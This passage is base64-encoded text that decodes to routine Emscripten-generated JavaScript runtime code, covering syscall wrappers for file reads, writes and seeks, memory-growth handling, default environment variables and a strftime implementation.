1Z2dlc3RGRCwgc3VnZ2VzdEZEKS5mZDsNCiAgICAgIH0sZG9SZWFkdjpmdW5jdGlvbihzdHJlYW0sIGlvdiwgaW92Y250LCBvZmZzZXQpIHsNCiAgICAgICAgdmFyIHJldCA9IDA7DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgaW92Y250OyBpKyspIHsNCiAgICAgICAgICB2YXIgcHRyID0gSEVBUDMyWygoKGlvdikrKGkqOCkpPj4yKV07DQogICAgICAgICAgdmFyIGxlbiA9IEhFQVAzMlsoKChpb3YpKyhpKjggKyA0KSk+PjIpXTsNCiAgICAgICAgICB2YXIgY3VyciA9IEZTLnJlYWQoc3RyZWFtLCBIRUFQOCxwdHIsIGxlbiwgb2Zmc2V0KTsNCiAgICAgICAgICBpZiAoY3VyciA8IDApIHJldHVybiAtMTsNCiAgICAgICAgICByZXQgKz0gY3VycjsNCiAgICAgICAgICBpZiAoY3VyciA8IGxlbikgYnJlYWs7IC8vIG5vdGhpbmcgbW9yZSB0byByZWFkDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHJldDsNCiAgICAgIH0sZG9Xcml0ZXY6ZnVuY3Rpb24oc3RyZWFtLCBpb3YsIGlvdmNudCwgb2Zmc2V0KSB7DQogICAgICAgIHZhciByZXQgPSAwOw0KICAgICAgICBmb3IgKHZhciBpID0gMDsgaSA8IGlvdmNudDsgaSsrKSB7DQogICAgICAgICAgdmFyIHB0ciA9IEhFQVAzMlsoKChpb3YpKyhpKjgpKT4+MildOw0KICAgICAgICAgIHZhciBsZW4gPSBIRUFQMzJbKCgoaW92KSsoaSo4ICsgNCkpPj4yKV07DQogICAgICAgICAgdmFyIGN1cnIgPSBGUy53cml0ZShzdHJlYW0sIEhFQVA4LHB0ciwgbGVuLCBvZmZzZXQpOw0KICAgICAgICAgIGlmIChjdXJyIDwgMCkgcmV0dXJuIC0xOw0KICAgICAgICAgIHJldCArPSBjdXJyOw0KICAgICAgICB9DQogICAgICAgIHJldHVybiByZXQ7DQogICAgICB9LHZhcmFyZ3M6dW5kZWZpbmVkLGdldDpmdW5jdGlvbigpIHsNCiAgICAgICAgYXNzZXJ0KFNZU0NBTExTLnZhcmFyZ3MgIT0gdW5kZWZpbmVkKTsNCiAgICAgICAgU1lTQ0FMTFMudmFyYXJncyArPSA0Ow0KICAgICAgICB2YXIgcmV0ID0gSEVBUDMyWygoKFNZU0NBTExTLnZhcmFyZ3MpLSg0KSk+PjIpXTsNCiAgICAgICAgcmV0dXJuIHJldDsNCiAgICAgIH0sZ2V0U3RyOmZ1bmN0aW9uKHB0cikgew0KICAgICAgICB2YXIgcmV0ID0gVVRGOFRvU3RyaW5nKHB0cik7DQogICAgICAgIHJldHVybiByZXQ7DQogICAgICB9LGdldFN0cmVhbUZyb21GRDpmdW5jdGlvbihmZCkgew0KICAgICAgICB2YXIgc3RyZWFtID0gRlMuZ2V0U3RyZWFtKGZkKTsNCiAgICAgICAgaWYgKCFzdHJlYW0pIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKDgpOw0KICAgICAgICByZXR1cm4gc3RyZWFtOw0KICAgICAgfSxnZXQ2NDpmdW5jdGlvbihsb3csIGhpZ2gpIHsNCiAgICAgICAgaWYgKGxvdyA+PSAwKSBhc3NlcnQoaGlnaCA9PT0gMCk7DQogICAgICAgIGVsc2UgYXNzZXJ0KGhpZ2ggPT09IC0xKTsNCiAgICAgICAgcmV0dXJuIGxvdzsNCiAgICAgIH19O2Z1bmN0aW9uIHN5c2NhbGxNdW5tYXAoYWRkciwgbGVuKSB7DQogICAgICBpZiAoKGFkZHIgfCAwKSA9PT0gLTEgfHwgbGVuID09PSAwKSB7DQogICAgICAgIHJldHVybiAtMjg7DQogICAgICB9DQogICAgICAvLyBUT0RPOiBzdXBwb3J0IHVubW1hcCdpbmcgcGFydHMgb2YgYWxsb2NhdGlvbnMNCiAgICAgIHZhciBpbmZvID0gU1lTQ0FMTFMubWFwcGluZ3NbYWRkcl07DQogICAgICBpZiAoIWluZm8pIHJldHVybiAwOw0KICAgICAgaWYgKGxlbiA9PT0gaW5mby5sZW4pIHsNCiAgICAgICAgdmFyIHN0cmVhbSA9IEZTLmdldFN0cmVhbShpbmZvLmZkKTsNCiAgICAgICAgaWYgKGluZm8ucHJvdCAmIDIpIHsNCiAgICAgICAgICBTWVNDQUxMUy5kb01zeW5jKGFkZHIsIHN0cmVhbSwgbGVuLCBpbmZvLmZsYWdzLCBpbmZvLm9mZnNldCk7DQogICAgICAgIH0NCiAgICAgICAgRlMubXVubWFwKHN0cmVhbSk7DQogICAgICAgIFNZU0NBTExTLm1hcHBpbmdzW2FkZHJdID0gbnVsbDsNCiAgICAgICAgaWYgKGluZm8uYWxsb2NhdGVkKSB7DQogICAgICAgICAgX2ZyZWUoaW5mby5tYWxsb2MpOw0KICAgICAgICB9DQogICAgICB9DQogICAgICByZXR1cm4gMDsNCiAgICB9ZnVuY3Rpb24gX19fc3lzX211bm1hcChhZGRyLCBsZW4pIHt0cnkgew0KICANCiAgICAgIHJldHVybiBzeXNjYWxsTXVubWFwKGFkZHIsIGxlbik7DQogICAgfSBjYXRjaCAoZSkgew0KICAgIGlmICh0eXBlb2YgRlMgPT09ICd1bmRlZmluZWQnIHx8ICEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKSBhYm9ydChlKTsNCiAgICByZXR1cm4gLWUuZXJybm87DQogIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIF9hYm9ydCgpIHsNCiAgICAgIGFib3J0KCk7DQogICAgfQ0KDQogIGZ1bmN0aW9uIF9lbXNjcmlwdGVuX2dldF9zYnJrX3B0cigpIHsNCiAgICAgIHJldHVybiAyMTUzNjsNCiAgICB9DQoNCiAgZnVuY3Rpb24gX2Vtc2NyaXB0ZW5fbWVtY3B5X2JpZyhkZXN0LCBzcmMsIG51bSkgew0KICAgICAgSEVBUFU4LmNvcHlXaXRoaW4oZGVzdCwgc3JjLCBzcmMgKyBudW0pOw0KICAgIH0NCg0KICANCiAgZnVuY3Rpb24gX2Vtc2NyaXB0ZW5fZ2V0X2hlYXBfc2l6ZSgpIHsNCiAgICAgIHJldHVybiBIRUFQVTgubGVuZ3RoOw0KICAgIH0NCiAgDQogIGZ1bmN0aW9uIGFib3J0T25DYW5ub3RHcm93TWVtb3J5KHJlcXVlc3RlZFNpemUpIHsNCiAgICAgIGFib3J0KCdDYW5ub3QgZW5sYXJnZSBtZW1vcnkgYXJyYXlzIHRvIHNpemUgJyArIHJlcXVlc3RlZFNpemUgKyAnIGJ5dGVzIChPT00pLiBFaXRoZXIgKDEpIGNvbXBpbGUgd2l0aCAgLXMgSU5JVElBTF9NRU1PUlk9WCAgd2l0aCBYIGhpZ2hlciB0aGFuIHRoZSBjdXJyZW50IHZhbHVlICcgKyBIRUFQOC5sZW5ndGggKyAnLCAoMikgY29tcGlsZSB3aXRoICAtcyBBTExPV19NRU1PUllfR1JPV1RIPTEgIHdoaWNoIGFsbG93cyBpbmNyZWFzaW5nIHRoZSBzaXplIGF0IHJ1bnRpbWUsIG9yICgzKSBpZiB5b3Ugd2FudCBtYWxsb2MgdG8gcmV0dXJuIE5VTEwgKDApIGluc3RlYWQgb2YgdGhpcyBhYm9ydCwgY29tcGlsZSB3aXRoICAtcyBBQk9SVElOR19NQUxMT0M9MCAnKTsNCiAgICB9ZnVuY3Rpb24gX2Vtc2NyaXB0ZW5fcmVzaXplX2hlYXAocmVxdWVzdGVkU2l6ZSkgew0KICAgICAgcmVxdWVzdGVkU2l6ZSA9IHJlcXVlc3RlZFNpemUgPj4+IDA7DQogICAgICBhYm9ydE9uQ2Fubm90R3Jvd01lbW9yeShyZXF1ZXN0ZWRTaXplKTsNCiAgICB9DQoNCiAgDQogIA0KICB2YXIgRU5WPXt9Ow0KICANCiAgZnVuY3Rpb24gX19nZXRFeGVjdXRhYmxlTmFtZSgpIHsNCiAgICAgIHJldHVybiB0aGlzUHJvZ3JhbSB8fCAnLi90aGlzLnByb2dyYW0nOw0KICAgIH1mdW5jdGlvbiBnZXRFbnZTdHJpbmdzKCkgew0KICAgICAgaWYgKCFnZXRFbnZTdHJpbmdzLnN0cmluZ3MpIHsNCiAgICAgICAgLy8gRGVmYXVsdCB2YWx1ZXMuDQogICAgICAgIHZhciBlbnYgPSB7DQogICAgICAgICAgJ1VTRVInOiAnd2ViX3VzZXInLA0KICAgICAgICAgICdMT0dOQU1FJzogJ3dlYl91c2VyJywNCiAgICAgICAgICAnUEFUSCc6ICcvJywNCiAgICAgICAgICAnUFdEJzogJy8nLA0KICAgICAgICAgICdIT01FJzogJy9ob21lL3dlYl91c2VyJywNCiAgICAgICAgICAvLyBCcm93c2VyIGxhbmd1YWdlIGRldGVjdGlvbiAjODc1MQ0KICAgICAgICAgICdMQU5HJzogKCh0eXBlb2YgbmF2aWdhdG9yID09PSAnb2JqZWN0JyAmJiBuYXZpZ2F0b3IubGFuZ3VhZ2VzICYmIG5hdmlnYXRvci5sYW5ndWFnZXNbMF0pIHx8ICdDJykucmVwbGFjZSgnLScsICdfJykgKyAnLlVURi04JywNCiAgICAgICAgICAnXyc6IF9fZ2V0RXhlY3V0YWJsZU5hbWUoKQ0KICAgICAgICB9Ow0KICAgICAgICAvLyBBcHBseSB0aGUgdXNlci1wcm92aWRlZCB2YWx1ZXMsIGlmIGFueS4NCiAgICAgICAgZm9yICh2YXIgeCBpbiBFTlYpIHsNCiAgICAgICAgICBlbnZbeF0gPSBFTlZbeF07DQogICAgICAgIH0NCiAgICAgICAgdmFyIHN0cmluZ3MgPSBbXTsNCiAgICAgICAgZm9yICh2YXIgeCBpbiBlbnYpIHsNCiAgICAgICAgICBzdHJpbmdzLnB1c2goeCArICc9JyArIGVudlt4XSk7DQogICAgICAgIH0NCiAgICAgICAgZ2V0RW52U3RyaW5ncy5zdHJpbmdzID0gc3RyaW5nczsNCiAgICAgIH0NCiAgICAgIHJldHVybiBnZXRFbnZTdHJpbmdzLnN0cmluZ3M7DQogICAgfWZ1bmN0aW9uIF9lbnZpcm9uX2dldChfX2Vudmlyb24sIGVudmlyb25fYnVmKSB7DQogICAgICB2YXIgYnVmU2l6ZSA9IDA7DQogICAgICBnZXRFbnZTdHJpbmdzKCkuZm9yRWFjaChmdW5jdGlvbihzdHJpbmcsIGkpIHsNCiAgICAgICAgdmFyIHB0ciA9IGVudmlyb25fYnVmICsgYnVmU2l6ZTsNCiAgICAgICAgSEVBUDMyWygoKF9fZW52aXJvbikrKGkgKiA0KSk+PjIpXT1wdHI7DQogICAgICAgIHdyaXRlQXNjaWlUb01lbW9yeShzdHJpbmcsIHB0cik7DQogICAgICAgIGJ1ZlNpemUgKz0gc3RyaW5nLmxlbmd0aCArIDE7DQogICAgICB9KTsNCiAgICAgIHJldHVybiAwOw0KICAgIH0NCg0KICBmdW5jdGlvbiBfZW52aXJvbl9zaXplc19nZXQocGVudmlyb25fY291bnQsIHBlbnZpcm9uX2J1Zl9zaXplKSB7DQogICAgICB2YXIgc3RyaW5ncyA9IGdldEVudlN0cmluZ3MoKTsNCiAgICAgIEhFQVAzMlsoKHBlbnZpcm9uX2NvdW50KT4+MildPXN0cmluZ3MubGVuZ3RoOw0KICAgICAgdmFyIGJ1ZlNpemUgPSAwOw0KICAgICAgc3RyaW5ncy5mb3JFYWNoKGZ1bmN0aW9uKHN0cmluZykgew0KICAgICAgICBidWZTaXplICs9IHN0cmluZy5sZW5ndGggKyAxOw0KICAgICAgfSk7DQogICAgICBIRUFQMzJbKChwZW52aXJvbl9idWZfc2l6ZSk+PjIpXT1idWZTaXplOw0KICAgICAgcmV0dXJuIDA7DQogICAgfQ0KDQogIGZ1bmN0aW9uIF9mZF9jbG9zZShmZCkge3RyeSB7DQogIA0KICAgICAgdmFyIHN0cmVhbSA9IFNZU0NBTExTLmdldFN0cmVhbUZyb21GRChmZCk7DQogICAgICBGUy5jbG9zZShzdHJlYW0pOw0KICAgICAgcmV0dXJuIDA7DQogICAgfSBjYXRjaCAoZSkgew0KICAgIGlmICh0eXBlb2YgRlMgPT09ICd1bmRlZmluZWQnIHx8ICEoZSBpbnN0YW5jZW9mIEZTLkVycm5vRXJyb3IpKSBhYm9ydChlKTsNCiAgICByZXR1cm4gZS5lcnJubzsNCiAgfQ0KICB9DQoNCiAgZnVuY3Rpb24gX2ZkX3JlYWQoZmQsIGlvdiwgaW92Y250LCBwbnVtKSB7dHJ5IHsNCiAgDQogICAgICB2YXIgc3RyZWFtID0gU1lTQ0FMTFMuZ2V0U3RyZWFtRnJvbUZEKGZkKTsNCiAgICAgIHZhciBudW0gPSBTWVNDQUxMUy5kb1JlYWR2KHN0cmVhbSwgaW92LCBpb3ZjbnQpOw0KICAgICAgSEVBUDMyWygocG51bSk+PjIpXT1udW0NCiAgICAgIHJldHVybiAwOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICBpZiAodHlwZW9mIEZTID09PSAndW5kZWZpbmVkJyB8fCAhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSkgYWJvcnQoZSk7DQogICAgcmV0dXJuIGUuZXJybm87DQogIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIF9mZF9zZWVrKGZkLCBvZmZzZXRfbG93LCBvZmZzZXRfaGlnaCwgd2hlbmNlLCBuZXdPZmZzZXQpIHt0cnkgew0KICANCiAgICAgIA0KICAgICAgdmFyIHN0cmVhbSA9IFNZU0NBTExTLmdldFN0cmVhbUZyb21GRChmZCk7DQogICAgICB2YXIgSElHSF9PRkZTRVQgPSAweDEwMDAwMDAwMDsgLy8gMl4zMg0KICAgICAgLy8gdXNlIGFuIHVuc2lnbmVkIG9wZXJhdG9yIG9uIGxvdyBhbmQgc2hpZnQgaGlnaCBieSAzMi1iaXRzDQogICAgICB2YXIgb2Zmc2V0ID0gb2Zmc2V0X2hpZ2ggKiBISUdIX09GRlNFVCArIChvZmZzZXRfbG93ID4+PiAwKTsNCiAgDQogICAgICB2YXIgRE9VQkxFX0xJTUlUID0gMHgyMDAwMDAwMDAwMDAwMDsgLy8gMl41Mw0KICAgICAgLy8gd2UgYWxzbyBjaGVjayBmb3IgZXF1YWxpdHkgc2luY2UgRE9VQkxFX0xJTUlUICsgMSA9PSBET1VCTEVfTElNSVQNCiAgICAgIGlmIChvZmZzZXQgPD0gLURPVUJMRV9MSU1JVCB8fCBvZmZzZXQgPj0gRE9VQkxFX0xJTUlUKSB7DQogICAgICAgIHJldHVybiAtNjE7DQogICAgICB9DQogIA0KICAgICAgRlMubGxzZWVrKHN0cmVhbSwgb2Zmc2V0LCB3aGVuY2UpOw0KICAgICAgKHRlbXBJNjQgPSBbc3RyZWFtLnBvc2l0aW9uPj4+MCwodGVtcERvdWJsZT1zdHJlYW0ucG9zaXRpb24sKCsoTWF0aF9hYnModGVtcERvdWJsZSkpKSA+PSAxLjAgPyAodGVtcERvdWJsZSA+IDAuMCA/ICgoTWF0aF9taW4oKCsoTWF0aF9mbG9vcigodGVtcERvdWJsZSkvNDI5NDk2NzI5Ni4wKSkpLCA0Mjk0OTY3Mjk1LjApKXwwKT4+PjAgOiAofn4oKCsoTWF0aF9jZWlsKCh0ZW1wRG91YmxlIC0gKygoKH5+KHRlbXBEb3VibGUpKSk+Pj4wKSkvNDI5NDk2NzI5Ni4wKSkpKSk+Pj4wKSA6IDApXSxIRUFQMzJbKChuZXdPZmZzZXQpPj4yKV09dGVtcEk2NFswXSxIRUFQMzJbKCgobmV3T2Zmc2V0KSsoNCkpPj4yKV09dGVtcEk2NFsxXSk7DQogICAgICBpZiAoc3RyZWFtLmdldGRlbnRzICYmIG9mZnNldCA9PT0gMCAmJiB3aGVuY2UgPT09IDApIHN0cmVhbS5nZXRkZW50cyA9IG51bGw7IC8vIHJlc2V0IHJlYWRkaXIgc3RhdGUNCiAgICAgIHJldHVybiAwOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICBpZiAodHlwZW9mIEZTID09PSAndW5kZWZpbmVkJyB8fCAhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSkgYWJvcnQoZSk7DQogICAgcmV0dXJuIGUuZXJybm87DQogIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIF9mZF93cml0ZShmZCwgaW92LCBpb3ZjbnQsIHBudW0pIHt0cnkgew0KICANCiAgICAgIHZhciBzdHJlYW0gPSBTWVNDQUxMUy5nZXRTdHJlYW1Gcm9tRkQoZmQpOw0KICAgICAgdmFyIG51bSA9IFNZU0NBTExTLmRvV3JpdGV2KHN0cmVhbSwgaW92LCBpb3ZjbnQpOw0KICAgICAgSEVBUDMyWygocG51bSk+PjIpXT1udW0NCiAgICAgIHJldHVybiAwOw0KICAgIH0gY2F0Y2ggKGUpIHsNCiAgICBpZiAodHlwZW9mIEZTID09PSAndW5kZWZpbmVkJyB8fCAhKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSkgYWJvcnQoZSk7DQogICAgcmV0dXJuIGUuZXJybm87DQogIH0NCiAgfQ0KDQogIGZ1bmN0aW9uIF9zZXRUZW1wUmV0MCgkaSkgew0KICAgICAgc2V0VGVtcFJldDAoKCRpKSB8IDApOw0KICAgIH0NCg0KICANCiAgDQogIGZ1bmN0aW9uIF9faXNMZWFwWWVhcih5ZWFyKSB7DQogICAgICAgIHJldHVybiB5ZWFyJTQgPT09IDAgJiYgKHllYXIlMTAwICE9PSAwIHx8IHllYXIlNDAwID09PSAwKTsNCiAgICB9DQogIA0KICBmdW5jdGlvbiBfX2FycmF5U3VtKGFycmF5LCBpbmRleCkgew0KICAgICAgdmFyIHN1bSA9IDA7DQogICAgICBmb3IgKHZhciBpID0gMDsgaSA8PSBpbmRleDsgc3VtICs9IGFycmF5W2krK10pIHsNCiAgICAgICAgLy8gbm8tb3ANCiAgICAgIH0NCiAgICAgIHJldHVybiBzdW07DQogICAgfQ0KICANCiAgDQogIHZhciBfX01PTlRIX0RBWVNfTEVBUD1bMzEsMjksMzEsMzAsMzEsMzAsMzEsMzEsMzAsMzEsMzAsMzFdOw0KICANCiAgdmFyIF9fTU9OVEhfREFZU19SRUdVTEFSPVszMSwyOCwzMSwzMCwzMSwzMCwzMSwzMSwzMCwzMSwzMCwzMV07ZnVuY3Rpb24gX19hZGREYXlzKGRhdGUsIGRheXMpIHsNCiAgICAgIHZhciBuZXdEYXRlID0gbmV3IERhdGUoZGF0ZS5nZXRUaW1lKCkpOw0KICAgICAgd2hpbGUoZGF5cyA+IDApIHsNCiAgICAgICAgdmFyIGxlYXAgPSBfX2lzTGVhcFllYXIobmV3RGF0ZS5nZXRGdWxsWWVhcigpKTsNCiAgICAgICAgdmFyIGN1cnJlbnRNb250aCA9IG5ld0RhdGUuZ2V0TW9udGgoKTsNCiAgICAgICAgdmFyIGRheXNJbkN1cnJlbnRNb250aCA9IChsZWFwID8gX19NT05USF9EQVlTX0xFQVAgOiBfX01PTlRIX0RBWVNfUkVHVUxBUilbY3VycmVudE1vbnRoXTsNCiAgDQogICAgICAgIGlmIChkYXlzID4gZGF5c0luQ3VycmVudE1vbnRoLW5ld0RhdGUuZ2V0RGF0ZSgpKSB7DQogICAgICAgICAgLy8gd2Ugc3BpbGwgb3ZlciB0byBuZXh0IG1vbnRoDQogICAgICAgICAgZGF5cyAtPSAoZGF5c0luQ3VycmVudE1vbnRoLW5ld0RhdGUuZ2V0RGF0ZSgpKzEpOw0KICAgICAgICAgIG5ld0RhdGUuc2V0RGF0ZSgxKTsNCiAgICAgICAgICBpZiAoY3VycmVudE1vbnRoIDwgMTEpIHsNCiAgICAgICAgICAgIG5ld0RhdGUuc2V0TW9udGgoY3VycmVudE1vbnRoKzEpDQogICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIG5ld0RhdGUuc2V0TW9udGgoMCk7DQogICAgICAgICAgICBuZXdEYXRlLnNldEZ1bGxZZWFyKG5ld0RhdGUuZ2V0RnVsbFllYXIoKSsxKTsNCiAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgLy8gd2Ugc3RheSBpbiBjdXJyZW50IG1vbnRoDQogICAgICAgICAgbmV3RGF0ZS5zZXREYXRlKG5ld0RhdGUuZ2V0RGF0ZSgpK2RheXMpOw0KICAgICAgICAgIHJldHVybiBuZXdEYXRlOw0KICAgICAgICB9DQogICAgICB9DQogIA0KICAgICAgcmV0dXJuIG5ld0RhdGU7DQogICAgfWZ1bmN0aW9uIF9zdHJmdGltZShzLCBtYXhzaXplLCBmb3JtYXQsIHRtKSB7DQogICAgICAvLyBzaXplX3Qgc3RyZnRpbWUoY2hhciAqcmVzdHJpY3Qgcywgc2l6ZV90IG1heHNpemUsIGNvbnN0IGNoYXIgKnJlc3RyaWN0IGZvcm1hdCwgY29uc3Qgc3RydWN0IHRtICpyZXN0cmljdCB0aW1lcHRyKTsNCiAgICAgIC8vIGh0dHA6Ly9wdWJzLm9wZW5ncm91cC5vcmcvb25saW5lcHVicy8wMDk2OTUzOTkvZnVuY3Rpb25zL3N0cmZ0aW1lLmh0bWwNCiAgDQogICAgICB2YXIgdG1fem9uZSA9IEhFQVAzMlsoKCh0bSkrKDQwKSk+PjIpXTsNCiAgDQogICAgICB2YXIgZGF0ZSA9IHsNCiAgICAgICAgdG1fc2VjOiBIRUFQMzJbKCh0bSk+PjIpXSwNCiAgICAgICAgdG1fbWluOiBIRUFQMzJbKCgodG0pKyg0KSk+PjIpXSwNCiAgICAgICAgdG1faG91cjogSEVBUDMyWygoKHRtKSsoOCkpPj4yKV0sDQogICAgICAgIHRtX21kYXk6IEhFQVAzMlsoKCh0bSkrKDEyKSk+PjIpXSwNCiAgICAgICAgdG1fbW9uOiBIRUFQMzJbKCgodG0pKygxNikpPj4yKV0sDQogICAgICAgIHRtX3llYXI6IEhFQVAzMlsoKCh0bSkrKDIwKSk+PjIpXSwNCiAgICAgICAgdG1fd2RheTogSEVBUDMyWygoKHRtKSsoMjQpKT4+MildLA0KICAgICAgICB0bV95ZGF5OiBIRUFQMzJbKCgodG0pKygyOCkpPj4yKV0sDQogICAgICAgIHRtX2lzZHN0OiBIRUFQMzJbKCgodG0pKygzMikpPj4yKV0sDQogICAgICAgIHRtX2dtdG9mZjogSEVBUDMyWygoKHRtKSsoMzYpKT4+MildLA0KICAgICAgICB0bV96b25lOiB0bV96b25lID8gVVRGOFRvU3RyaW5nKHRtX3pvbmUpIDogJycNCiAgICAgIH07DQogIA0KICAgICAgdmFyIHBhdHRlcm4gPSBVVEY4VG9TdHJpbmcoZm9ybWF0KTsNCiAgDQogICAgICAvLyBleHBhbmQgZm9ybWF0DQogICAgICB2YXIgRVhQQU5TSU9OX1JVTEVTXzEgPSB7DQogICAgICAgICclYyc6ICclYSAlYiAlZCAlSDolTTolUyAlWScsICAgICAvLyBSZXBsYWNlZCBieSB0aGUgbG9jYWxlJ3MgYXBwcm9wcmlhdGUgZGF0ZSBhbmQgdGltZSByZXByZXNlbnRhdGlvbiAtIGUuZy4sIE1vbiBBdWcgIDMgMTQ6MDI6MDEgMjAxMw0KICAgICAgICAnJUQnOiAnJW0vJWQvJXknLCAgICAgICAgICAgICAgICAgLy8gRXF1aXZhbGVudCB0byAlbSAvICVkIC8gJXkNCiAgICAgICAgJyVGJzogJyVZLSVtLSVkJywgICAgICAgICAgICAgICAgIC8vIEVxdWl2YWxlbnQgdG8gJVkgLSAlbSAtICVkDQogICAgICAgICclaCc6ICclYicsICAgICAgICAgICAgICAgICAgICAgICAvLyBFcXVpdmFsZW50IHRvICViDQogICAgICAgICclcic6ICclSTolTTolUyAlcCcsICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgdGltZSBpbiBhLm0uIGFuZCBwLm0uIG5vdGF0aW9uDQogICAgICAgICclUic6ICclSDolTScsICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgdGltZSBpbiAyNC1ob3VyIG5vdGF0aW9uDQogICAgICAgICclVCc6ICclSDolTTolUycsICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgdGltZQ0KICAgICAgICAnJXgnOiAnJW0vJWQvJXknLCAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIGxvY2FsZSdzIGFwcHJvcHJpYXRlIGRhdGUgcmVwcmVzZW50YXRpb24NCiAgICAgICAgJyVYJzogJyVIOiVNOiVTJywgICAgICAgICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSBsb2NhbGUncyBhcHByb3ByaWF0ZSB0aW1lIHJlcHJlc2VudGF0aW9uDQogICAgICAgIC8vIE1vZGlmaWVkIENvbnZlcnNpb24gU3BlY2lmaWVycw0KICAgICAgICAnJUVjJzogJyVjJywgICAgICAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlIGFwcHJvcHJpYXRlIGRhdGUgYW5kIHRpbWUgcmVwcmVzZW50YXRpb24uDQogICAgICAgICclRUMnOiAnJUMnLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgbmFtZSBvZiB0aGUgYmFzZSB5ZWFyIChwZXJpb2QpIGluIHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSByZXByZXNlbnRhdGlvbi4NCiAgICAgICAgJyVFeCc6ICclbS8lZC8leScsICAgICAgICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSBkYXRlIHJlcHJlc2VudGF0aW9uLg0KICAgICAgICAnJUVYJzogJyVIOiVNOiVTJywgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlIHRpbWUgcmVwcmVzZW50YXRpb24uDQogICAgICAgICclRXknOiAnJXknLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgb2Zmc2V0IGZyb20gJUVDICh5ZWFyIG9ubHkpIGluIHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSByZXByZXNlbnRhdGlvbi4NCiAgICAgICAgJyVFWSc6ICclWScsICAgICAgICAgICAgICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSBmdWxsIGFsdGVybmF0aXZlIHllYXIgcmVwcmVzZW50YXRpb24uDQogICAgICAgICclT2QnOiAnJWQnLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgZGF5IG9mIHRoZSBtb250aCwgdXNpbmcgdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlIG51bWVyaWMgc3ltYm9scywgZmlsbGVkIGFzIG5lZWRlZCB3aXRoIGxlYWRpbmcgemVyb3MgaWYgdGhlcmUgaXMgYW55IGFsdGVybmF0aXZlIHN5bWJvbCBmb3IgemVybzsgb3RoZXJ3aXNlLCB3aXRoIGxlYWRpbmcgPHNwYWNlPiBjaGFyYWN0ZXJzLg0KICAgICAgICAnJU9lJzogJyVlJywgICAgICAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIGRheSBvZiB0aGUgbW9udGgsIHVzaW5nIHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSBudW1lcmljIHN5bWJvbHMsIGZpbGxlZCBhcyBuZWVkZWQgd2l0aCBsZWFkaW5nIDxzcGFjZT4gY2hhcmFjdGVycy4NCiAgICAgICAgJyVPSCc6ICclSCcsICAgICAgICAgICAgICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSBob3VyICgyNC1ob3VyIGNsb2NrKSB1c2luZyB0aGUgbG9jYWxlJ3MgYWx0ZXJuYXRpdmUgbnVtZXJpYyBzeW1ib2xzLg0KICAgICAgICAnJU9JJzogJyVJJywgICAgICAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIGhvdXIgKDEyLWhvdXIgY2xvY2spIHVzaW5nIHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSBudW1lcmljIHN5bWJvbHMuDQogICAgICAgICclT20nOiAnJW0nLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgbW9udGggdXNpbmcgdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlIG51bWVyaWMgc3ltYm9scy4NCiAgICAgICAgJyVPTSc6ICclTScsICAgICAgICAgICAgICAgICAgICAgIC8vIFJlcGxhY2VkIGJ5IHRoZSBtaW51dGVzIHVzaW5nIHRoZSBsb2NhbGUncyBhbHRlcm5hdGl2ZSBudW1lcmljIHN5bWJvbHMuDQogICAgICAgICclT1MnOiAnJVMnLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgc2Vjb25kcyB1c2luZyB0aGUgbG9jYWxlJ3MgYWx0ZXJuYXRpdmUgbnVtZXJpYyBzeW1ib2xzLg0KICAgICAgICAnJU91JzogJyV1JywgICAgICAgICAgICAgICAgICAgICAgLy8gUmVwbGFjZWQgYnkgdGhlIHdlZWtkYXkgYXMgYSBudW1iZXIgaW4gdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlIHJlcHJlc2VudGF0aW9uIChNb25kYXk9MSkuDQogICAgICAgICclT1UnOiAnJVUnLCAgICAgICAgICAgICAgICAgICAgICAvLyBSZXBsYWNlZCBieSB0aGUgd2VlayBudW1iZXIgb2YgdGhlIHllYXIgKFN1bmRheSBhcyB0aGUgZmlyc3QgZGF5IG9mIHRoZSB3ZWVrLCBydWxlcyBjb3JyZXNwb25kaW5nIHRvICVVICkgdXNpbmcgdGhlIGxvY2FsZSdzIGFsdGVybmF0aXZlI